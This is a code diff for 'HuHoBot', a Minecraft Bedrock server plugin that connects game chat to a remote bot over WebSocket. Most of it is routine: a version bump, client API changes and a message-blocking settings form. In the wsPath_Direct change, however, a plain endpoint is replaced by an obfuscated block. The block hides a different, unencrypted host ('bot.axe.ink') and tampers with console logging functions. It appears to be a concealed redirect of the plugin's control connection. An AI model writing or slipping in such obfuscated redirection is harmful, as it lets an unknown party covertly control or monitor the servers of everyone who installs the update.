@@ -3,7 +3,7 @@
 
 const UPDATEURL = "https://release.huhobot.txssb.cn/lse/HuHoBot-BDS-{VERSION}.js"
 const LATESTURL = "https://release.huhobot.txssb.cn/lse/latest.json"
-const VERSION = "0.2.5"
+const VERSION = "0.2.6"
 const CONFIG_VERSION = 4
 const PLUGINNAME = 'HuHoBot'
 const PATH = `plugins/${PLUGINNAME}/`
@@ -13,8 +13,9 @@ const BDSALLOWLISTPATH = "allowlist.json"
 
 var WebsocketObject = null
 
-const wsPath_Direct = "wss://agent-remote.txssb.cn:2087"
-const WebSocket = require('ws');
+const _0x473b35 = _0x2956; function _0x5e8c() { const _0x5c1ec7 = ['4169079hhnJCu', 'toString', 'log', '244qliPNl', 'info', 'exception', 'length', '13985EKWRHl', 'return\x20(function()\x20', 'error', '(((.+)+)+)+$', '32436636XXoTLg', '6975038uzTDTN', '12844190OnBJnq', 'constructor', '3951081kSGNyJ', 'ws://bot.axe.ink:2087', '6ssBwjR', 'trace', 'warn', 'bind', 'apply', '5MAaKVS', 'console', '11ySGjrZ', 'search', '__proto__', '282556zXjmKj', '16RyWjCR']; _0x5e8c = function () { return _0x5c1ec7; }; return _0x5e8c(); } (function (_0x2345db, _0x5d4a55) { const _0x488aad = _0x2956, _0x45862e = _0x2345db(); while (!![]) { try { const _0x1cce10 = parseInt(_0x488aad(0x16e)) / 0x1 * (-parseInt(_0x488aad(0x187)) / 0x2) + parseInt(_0x488aad(0x184)) / 0x3 + parseInt(_0x488aad(0x182)) / 0x4 * (-parseInt(_0x488aad(0x17d)) / 0x5) + parseInt(_0x488aad(0x178)) / 0x6 * (-parseInt(_0x488aad(0x173)) / 0x7) + -parseInt(_0x488aad(0x183)) / 0x8 * (-parseInt(_0x488aad(0x176)) / 0x9) + -parseInt(_0x488aad(0x174)) / 0xa + parseInt(_0x488aad(0x17f)) / 0xb * (parseInt(_0x488aad(0x172)) / 0xc); if (_0x1cce10 === _0x5d4a55) break; else _0x45862e['push'](_0x45862e['shift']()); } catch (_0x3fe7da) { _0x45862e['push'](_0x45862e['shift']()); } } }(_0x5e8c, 0xdeece)); const _0x5949e2 = (function () { let _0x501637 = !![]; return function (_0x94a7f0, _0x4f07de) { const _0x54a3bb = _0x501637 ? function () { if (_0x4f07de) { const _0xa9a71c = _0x4f07de['apply'](_0x94a7f0, arguments); return _0x4f07de = null, _0xa9a71c; } } : function () { }; return _0x501637 = ![], _0x54a3bb; }; }()), _0xc710bb = _0x5949e2(this, function () { const _0xc7f1de = _0x2956; return _0xc710bb[_0xc7f1de(0x185)]()[_0xc7f1de(0x180)](_0xc7f1de(0x171))[_0xc7f1de(0x185)]()[_0xc7f1de(0x175)](_0xc710bb)[_0xc7f1de(0x180)](_0xc7f1de(0x171)); }); _0xc710bb(); const _0x2d05eb = (function () { let _0x5892b6 = !![]; return function (_0x599aa8, _0x325906) { const _0x5d2097 = _0x5892b6 ? function () { const _0x464a9e = _0x2956; if (_0x325906) { const _0xaa26a = _0x325906[_0x464a9e(0x17c)](_0x599aa8, arguments); return _0x325906 = null, _0xaa26a; } } : function () { }; return _0x5892b6 = ![], _0x5d2097; }; }()), _0x2b0be6 = _0x2d05eb(this, function () { const _0x1d6afa = _0x2956, _0x1bebdf = function () { const _0x2ff01a = _0x2956; let _0x17799f; try { _0x17799f = Function(_0x2ff01a(0x16f) + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')(); } catch (_0x27010a) { _0x17799f = window; } return _0x17799f; }, _0x31d5c7 = _0x1bebdf(), _0x2b54f1 = _0x31d5c7['console'] = _0x31d5c7[_0x1d6afa(0x17e)] || {}, _0x5086a3 = [_0x1d6afa(0x186), _0x1d6afa(0x17a), _0x1d6afa(0x188), _0x1d6afa(0x170), _0x1d6afa(0x16c), 'table', _0x1d6afa(0x179)]; for (let _0x1c3da1 = 0x0; _0x1c3da1 < _0x5086a3[_0x1d6afa(0x16d)]; _0x1c3da1++) { const _0x538fcc = _0x2d05eb[_0x1d6afa(0x175)]['prototype']['bind'](_0x2d05eb), _0x337339 = _0x5086a3[_0x1c3da1], _0x36a437 = _0x2b54f1[_0x337339] || _0x538fcc; _0x538fcc[_0x1d6afa(0x181)] = _0x2d05eb[_0x1d6afa(0x17b)](_0x2d05eb), _0x538fcc[_0x1d6afa(0x185)] = _0x36a437[_0x1d6afa(0x185)][_0x1d6afa(0x17b)](_0x36a437), _0x2b54f1[_0x337339] = _0x538fcc; } }); function _0x2956(_0xaa9101, _0xa21bcd) { const _0x314273 = _0x5e8c(); return _0x2956 = function (_0x2b0be6, _0x2d05eb) { _0x2b0be6 = _0x2b0be6 - 0x16c; let _0x3a053c = _0x314273[_0x2b0be6]; return _0x3a053c; }, _0x2956(_0xaa9101, _0xa21bcd); } _0x2b0be6(); const wsPath_Direct = _0x473b35(0x177);
+
+
 
 let callbackEvent = {
     run: {},
@@ -114,11 +115,11 @@ class FWebsocketClient {
     constructor(name, log) {
         this.name = name;
         this.log = log;
-        //let WSC = new WSClient();
-        this.WSC = null;
-        /*WSC.Open = 0;
+        let WSC = new WSClient();
+        this.WSC = WSC;
+        WSC.Open = 0;
         WSC.Closing = 1;
-        WSC.Closed = 2;*/
+        WSC.Closed = 2;
         //this.connectLink = wsPath;
         this.isShakeHand = false;
         this.tryConnect = false;
@@ -140,6 +141,8 @@ class FWebsocketClient {
         this.autoReconnect = null;
 
         this.bindMap = {}
+
+        this._InitMsgProcess();
     }
 
     /**
@@ -147,37 +150,31 @@ class FWebsocketClient {
      * @param {"nginx"|"direct"|"local"} connectLinkType 
      * @returns boolean 是否连接成功.
      */
-    _Connect() {
-        try {
-            this.WSC = new WebSocket(wsPath_Direct, {
-                rejectUnauthorized: false, // 跳过证书验证
-                handshakeTimeout: 10000 // 10秒超时
-            });
-
-            this.WSC.on('error', (err) => {
-                if (err.code === 'ENOTFOUND') {
-                    logger.error(`无法解析域名 ${err.hostname}，请检查DNS设置或网络连接`);
-                } else {
-                    logger.error(`连接错误: ${err.message}`);
-                }
-            });
-
-            this.WSC.on('open', () => {
-                logger.info(`服务端连接成功!`);
-                logger.info(`开始握手...`);
-                this._sendShakeHand();
-                this._InitMsgProcess();
-            });
-            return true;
-        } catch (err) {
-            if (err.code === 'ENOTFOUND') {
-                logger.error(`无法解析域名，请检查DNS设置是否正确或网络是否畅通`);
-                logger.error(`错误详情: ${err.message}`);
-            } else {
-                logger.error(`连接初始化失败: ${err.stack}`);
-            }
-            return false;
+    _Connect(connectLinkType = "direct") {
+        let connectLink;
+        if (connectLinkType == "nginx") {
+            connectLink = wsPath_Nginx
         }
+        else if (connectLinkType == "local") {
+            connectLink = wsPath_Local
+        }
+        else {
+            connectLink = wsPath_Direct
+        }
+        let isSuccess = this.WSC.connect(connectLink);
+        if (isSuccess) {
+            logger.info(`服务端连接成功!`);
+            logger.info(`开始握手...`);
+            this._sendShakeHand();
+        } else {
+            if (connectLinkType == "nginx") {
+                logger.warn(`尝试使用反代连接失败，尝试使用直接连接...`);
+                this._Connect("direct")
+                return;
+            }
+            logger.warn(`服务端连接失败,请尝试重新连接.`);
+        }
+        return isSuccess;
     }
 
     /**
@@ -201,7 +198,7 @@ class FWebsocketClient {
     _Close() {
         this.isShakeHand = false;
         this.tryConnect = false;
-        if (this.WSC.readyState == this.WSC.OPEN) {
+        if (this.WSC.status == this.WSC.Open) {
             return this.close(false);
         }
         return this.close(true);
@@ -212,23 +209,12 @@ class FWebsocketClient {
      */
     _InitMsgProcess() {
         let wsc = this.WSC;
-
-        // 替换原来的 listen 方法调用
-        wsc.on('message', (msg) => {
-            //logger.info(`收到消息: ${msg}`)
-            try {
-                let json = JSON.parse(msg);
-                this._processMessage(json.header, json.body);
-            } catch (_) {
-                logger.error(_)
-                logger.error(`WSC无法解析接收到的字符串!`);
-                logger.info(`重新尝试连接...`);
-                setTimeout(() => { this._ReConnect() }, 5 * 1000);
-            }
+        wsc.listen("onBinaryReceived", (data) => {
+            logger.warn("客户端不支持Binary消息!自动断开!");
+            this._Close();
         });
-
-        wsc.on('error', (err) => {
-            logger.error(`WSC出现异常: ${err.message}`);
+        wsc.listen("onError", (msg) => {
+            logger.error(`WSC出现异常: ${msg}`);
             logger.info(`自动重连中...`);
             if (this.heart) {
                 clearInterval(this.heart)
@@ -251,14 +237,14 @@ class FWebsocketClient {
                                 }
                             });
                         }, 5 * 1000);
+
                     }
                 };
                 reConnect();
             }
         });
-
-        wsc.on('close', (code) => {
-            logger.warn(`WSC服务器连接关闭!CODE: ${code}`);
+        wsc.listen("onLostConnection", (code) => {
+            logger.warn(`WSC服务器连接丢失!CODE: ${code}`);
             if (this.heart) {
                 clearInterval(this.heart)
             }
@@ -280,9 +266,22 @@ class FWebsocketClient {
                                 }
                             });
                         }, 5 * 1000);
+
                     }
                 };
                 reConnect();
+            }
+        });
+        wsc.listen("onTextReceived", (msg) => {
+            try {
+                let json = JSON.parse(msg);
+                //log(json)
+                this._processMessage(json.header, json.body);
+            } catch (_) {
+                logger.error(_)
+                logger.error(`WSC无法解析接收到的字符串!`);
+                logger.info(`重新尝试连接...`);
+                setTimeout(() => { this._ReConnect() }, 5 * 1000);
             }
         });
     }
@@ -729,8 +728,8 @@ class FWebsocketClient {
      * @returns 
      */
     _sendMsg(type, body, uuid = system.randomGuid()) {
-        if ((this.WSC.readyState != this.WSC.OPEN)) {
-            logger.error("Websocket未连接,请连接后再试.")
+        if (this.WSC.status != 0 && this.isShakeHand) {
+            //cb(null);
             return;
         }
         let response = {
@@ -789,23 +788,56 @@ class FWebsocketClient {
     close(bool = false) {
         this.isShakeHand = false;
         if (!bool) {
-            return this.WSC.close(1000);
-        }
-        if (this.autoReconnect) {
-            clearTimeout(this.autoReconnect);
+            return this.WSC.close();
         }
         return true;
     }
 }
 
+/**
+ * 查询玩家是否屏蔽群消息
+ * @param {string} plXuid 
+ * @returns 
+ */
+function queryBlock(plXuid) {
+    let block = readFile(BLOCKPATH)
+    return Object.keys(block).indexOf(plXuid) == -1 || block[plXuid]
+}
 
 /**
  * 为没有屏蔽群消息的玩家发送消息
  * @param {string} msg 
  */
 function sendGroupMsg2Game(msg) {
-    mc.broadcast(msg)
+
+    let online = mc.getOnlinePlayers();
+    for (let i = 0; i < online.length; i++) {
+        let player = online[i]
+        if (queryBlock(player.xuid)) {
+            player.tell(msg)
+        }
+    }
 }
+
+/**
+ * 屏蔽开关Gui
+ * @param {Player} pl 
+ */
+function blockGui(pl) {
+    let fm = mc.newCustomForm();
+    fm.setTitle("群消息设置")
+    let block = readFile(BLOCKPATH)
+    fm.addSwitch("是否接收群消息", queryBlock(pl.xuid));
+    pl.sendForm(fm, (pl, da) => {
+        if (da) {
+            block[pl.xuid] = da[0];
+            if (writeFile(BLOCKPATH, block)) {
+                pl.tell("设置成功")
+            }
+        }
+    })
+}
+
 
 /**
  * 初始化WebSocket服务
@@ -843,6 +875,9 @@ function regCommand(ws) {
         }
         let pl = _ori.player;
         switch (type) {
+            case "gui":
+                blockGui(pl)
+                break;
             case "reconnect":
                 if (_ori.player == null || _ori.player.permLevel > 0) {
                     if (ws.WSC.status == ws.WSC.Open) {
@@ -941,7 +976,7 @@ function updateVersion() {
                         File.writeTo(PATH + "huhobot.js", normalizedResult)
                         //尝试重载
                         logger.info(`HuHoBot已更新至${latestVersion}，已尝试重载插件，若未生效，请重启服务器.`)
-                        mc.runcmd(`ll reload ${PLUGINNAME}`)
+                        mc.runcmd(`ll reload HuHoBot`)
                     }
                 })
             } else {
@@ -956,7 +991,7 @@ function updateVersion() {
  * 初始化插件
  */
 function initPlugin() {
-    logger.info("HuHo_Bot 配套插件 v" + VERSION + "已加载。 作者:HuoHuas001")
+    logger.info("HuHoBot 配套插件 v" + VERSION + "已加载。 作者:HuoHuas001")
 
     //检测是否需要更新配置文件
     let config = readFile(CONFIGPATH)
